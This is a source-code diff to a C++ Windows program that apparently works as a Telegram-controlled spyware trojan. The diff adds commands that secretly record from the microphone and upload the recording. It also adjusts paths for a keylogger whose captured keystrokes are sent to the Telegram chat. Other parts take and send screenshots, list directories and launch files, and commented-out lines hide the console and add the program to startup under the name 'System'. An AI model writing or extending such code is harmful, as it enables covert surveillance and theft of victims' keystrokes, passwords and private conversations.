@@ -10,9 +10,10 @@
 #include "screenshot.h"
 #include "modes.h"
 #include "handle_result.h"
+#include "audio.h"
 
 
-void executeIfStandardMode(TgBot::Bot& bot, TgBot::Message::Ptr message, std::function<void(int64_t)> command) {
+static void executeIfStandardMode(TgBot::Bot& bot, TgBot::Message::Ptr message, std::function<void(int64_t)> command) {
 	if (currentMode == Mode::STANDARD) {
 		int64_t chat_id = message->chat->id;
 		command(chat_id);
@@ -69,11 +70,34 @@ void startBot(const std::string& token)
 		});
 
 
+	bot.getEvents().onCommand("start_record", [&bot](TgBot::Message::Ptr message) {
+
+		executeIfStandardMode(bot, message, [&](int64_t chat_id) {
+			bot.getApi().sendMessage(chat_id, "Starting micro record.");
+			Result result = startRecord();
+			handleResult(result, bot, chat_id);
+			});
+		});
+
+
+	bot.getEvents().onCommand("kill_record", [&bot](TgBot::Message::Ptr message) {
+		executeIfStandardMode(bot, message, [&](int64_t chat_id) {
+			bot.getApi().sendMessage(chat_id, "Killing current micro record session.");
+			waveInStop(hWaveIn);
+			waveInClose(hWaveIn);
+
+			Result result = deleteFile(tempPath + audioFileName);
+			handleResult(result, bot, chat_id);
+			});
+		});
+
+
 	bot.getEvents().onCommand("kill_key_logger", [&bot](TgBot::Message::Ptr message) {
 		executeIfStandardMode(bot, message, [&](int64_t chat_id) {
 			isKeyLoggerRunning = false;
 			bot.getApi().sendMessage(chat_id, "Killing current key_logger session.");
-			Result result = deleteFile(klFilename);
+			
+			Result result = deleteFile(tempPath + klFileName);
 			handleResult(result, bot, chat_id);
 			});
 		});
@@ -81,7 +105,15 @@ void startBot(const std::string& token)
 
 	bot.getEvents().onCommand("send_key_logger", [&bot](TgBot::Message::Ptr message) {
 		executeIfStandardMode(bot, message, [&](int64_t chat_id) {
-			Result result = sendFile(bot, klFilename, chat_id);
+			Result result = sendFile(bot, tempPath + klFileName, chat_id);
+			handleResult(result, bot, chat_id);
+			});
+		});
+
+
+	bot.getEvents().onCommand("send_record", [&bot](TgBot::Message::Ptr message) {
+		executeIfStandardMode(bot, message, [&](int64_t chat_id) {
+			Result result = sendFile(bot, tempPath + audioFileName, chat_id);
 			handleResult(result, bot, chat_id);
 			});
 		});
@@ -92,8 +124,9 @@ void startBot(const std::string& token)
 			try {
 				char tempPath[MAX_PATH];
 				GetTempPathA(MAX_PATH, tempPath);
-				string tempFile = string(tempPath) + "scrtemp.bmp";
-				Result result = takeScreenshot(tempFile);
+				//string tempFile = string(tempPath) + "scrtemp.png";
+				string tempFile = "scrtemp.png";
+				Result result = takeScreenshot(utf8_to_wstring(tempFile));
 				handleResult(result, bot, chat_id);
 				result = sendFile(bot, tempFile, chat_id);
 				handleResult(result, bot, chat_id);
@@ -228,7 +261,7 @@ void startBot(const std::string& token)
 			result = checkDir(message->text);
 			break;
 		case Mode::FULL_CHECK_DIR:
-			result = fullCheckDir(message->text);
+			result = fullCheckDir(message->text, bot, message->chat->id);
 			break;
 		case Mode::START_FILE:
 			result = startFile(message->text);
@@ -272,8 +305,9 @@ void startBot(const std::string& token)
 
 int main()
 {
-	setlocale(LC_ALL, "Russian");
+	//setlocale(LC_ALL, "Russian");
 	//HideConsole();
+	initTempPath(); // receive temp path on this device
 
 	//AddToStartup(L"System", L"path\\to\\your\\program.exe");
 
